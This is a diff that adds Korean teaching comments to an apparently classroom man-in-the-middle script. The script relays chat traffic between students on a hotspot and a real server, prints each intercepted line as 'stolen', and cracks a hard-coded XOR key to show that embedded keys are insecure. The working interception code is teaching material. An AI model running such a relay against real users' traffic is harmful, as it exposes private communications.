@@ -23,14 +23,14 @@ import socket
 import threading
 
 # 학생(피해자)을 받는 곳: 핫스팟의 모든 주소에서 수신
-LISTEN_HOST, LISTEN_PORT = "0.0.0.0", 5000
+LISTEN_HOST, LISTEN_PORT = "0.0.0.0", 5000  #가짜 서버 행세 
 # 진짜 채팅 서비스(★ 다른 컴퓨터의 IP 로 바꾸세요. 같은 핫스팟에 붙은 그 컴퓨터)
-SERVER_HOST, SERVER_PORT = "192.168.137.50", 5000
+SERVER_HOST, SERVER_PORT = "192.168.137.50", 5000  #진짜 server.py
 
 # (심화) True 로 켜면, 코드에 '박힌' 열쇠로 XOR 암호를 풀어 본다.
 #   → "열쇠가 코드에 있으면 암호도 뚫린다 = 진짜 보안이 아니다"
 SHOW_CRACK = False
-XOR_KEY = 42
+XOR_KEY = 42 ##이게 보이면 바로 뚫리지? --> 코드에 박아두지 말고 매번 다르게 아무도 훔쳐보지 못하게 몰래 주고받아야함
 
 _BASE64_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
 
@@ -43,9 +43,9 @@ def looks_readable(text):
 def try_crack(text):
     import base64
     try:
-        raw = base64.b64decode(text)
-        plain = bytes(b ^ XOR_KEY for b in raw).decode("utf-8")
-        return plain if "|" in plain else None
+        raw = base64.b64decode(text) #암호문의 포장지를 벗겨서 원래 바이트로 되돌림
+        plain = bytes(b ^ XOR_KEY for b in raw).decode("utf-8") # XOR로 암호풀기
+        return plain if "|" in plain else None #평문이 | 있으면 제대로 풀음
     except Exception:
         return None
 
@@ -54,10 +54,10 @@ def steal(direction, text):
     if not text:
         return
     arrow = "학생 → 서비스" if direction == "up" else "서비스 → 학생"
-    if looks_readable(text):
+    if looks_readable(text): ##PlainCodec 평문화 
         print(f"  😱 [탈취 성공] {arrow}  |  {text}")
-    else:
-        print(f"  🔒 [탈취 실패] {arrow}  |  {text}   ← 알아볼 수 없음")
+    else:   
+        print(f"  🔒 [탈취 실패] {arrow}  |  {text}   ← 알아볼 수 없음") #SecertCodec 암호화 
         if SHOW_CRACK:
             cracked = try_crack(text)
             if cracked:
@@ -69,9 +69,9 @@ def pump(src, dst, direction):
     reader = src.makefile("rb")
     try:
         for raw in reader:
-            dst.sendall(raw)                     # ① 그대로 중계 → 채팅은 멀쩡
+            dst.sendall(raw)                     # ① 그대로 진짜 서버로 중계 → 채팅은 멀쩡
             text = raw.decode("utf-8", "replace").rstrip("\n")
-            steal(direction, text)               # ② 몰래 엿보기 → 탈취
+            steal(direction, text)               # ② 내용 복사해서 steal()넘김
     except OSError:
         pass
     finally:
@@ -84,14 +84,15 @@ def pump(src, dst, direction):
 def handle(client_conn, addr):
     try:
         server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_conn.connect((SERVER_HOST, SERVER_PORT)) 
+        server_conn.connect((SERVER_HOST, SERVER_PORT))
+        ##호구가 붙으면 스니퍼는 자기가 호구인척 하고 진짜 서버에 새로 연결 만들고(server_conn) 스니퍼는 양쪽에 하나씩 들고 있는 상태
     except OSError:
         print(f"[중간자] 진짜 서버({SERVER_HOST}:{SERVER_PORT})에 연결 실패 — "
               f"그 컴퓨터의 server.py 실행/방화벽/IP 를 확인하세요.")
         client_conn.close()
         return
-    threading.Thread(target=pump, args=(client_conn, server_conn, "up"), daemon=True).start()
-    pump(server_conn, client_conn, "down")
+    threading.Thread(target=pump, args=(client_conn, server_conn, "up"), daemon=True).start() #여기서 또 스레드 만든다. up스레드 : 호구가 보낸 메세지를 서버로 
+    pump(server_conn, client_conn, "down")  #메인 스레드가 직접: 서버 -> 호구  
     client_conn.close()
     server_conn.close()
 
@@ -105,9 +106,9 @@ def main():
     print("[중간자] 지나가는 모든 줄을 몰래 엿봅니다. (Ctrl+C 종료)\n")
     try:
         while True:
-            client_conn, addr = listener.accept()
+            client_conn, addr = listener.accept() ###여기서부터 시작 --> 학생이 핫스팟에 붙어서 채팅 프로그램 켜는 순간, 연결을 client_conn손에 쥐게 됨
             print(f"[중간자] 새 학생 접속: {addr}")
-            threading.Thread(target=handle, args=(client_conn, addr), daemon=True).start()
+            threading.Thread(target=handle, args=(client_conn, addr), daemon=True).start() #그 학생 전담 쓰레드를 만들어서 핸들로 맡김 ##각자 스레드에서 병렬적 처리
     except KeyboardInterrupt:
         print("\n[중간자] 종료합니다.")
     finally:
